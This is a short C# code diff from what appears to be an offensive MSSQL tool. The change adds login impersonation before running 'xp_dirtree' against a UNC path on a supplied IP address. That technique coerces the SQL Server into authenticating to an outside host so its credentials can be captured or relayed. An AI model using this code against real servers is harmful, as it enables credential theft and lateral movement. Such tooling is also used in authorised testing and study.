@@ -67,6 +67,13 @@ Optional arguments:
                 return;
             }
 
+            // I am confused about why it is necessary to perform this step as a separate procedure
+            // But it seems in-line impersonation doesn't work properly
+            if (!String.IsNullOrEmpty(argumentSet.impersonate))
+            {
+                Console.WriteLine("[*] Attempting impersonation as {0}", argumentSet.impersonate);
+                SQLExecutor.ExecuteProcedure(connection, "", argumentSet.impersonate);
+            }
 
             string queryUNC = $"EXEC master..xp_dirtree \"\\\\{ip}\\\\test\";";
             if (!String.IsNullOrEmpty(argumentSet.target) && !String.IsNullOrEmpty(argumentSet.intermediate))
@@ -92,7 +99,10 @@ Optional arguments:
                     argumentSet.impersonate_linked
                     );
             }
-            SQLExecutor.ExecuteProcedure(connection, queryUNC);
+            SQLExecutor.ExecuteProcedure(
+                connection, 
+                queryUNC,
+                argumentSet.impersonate);
 
             connection.Close();
         }
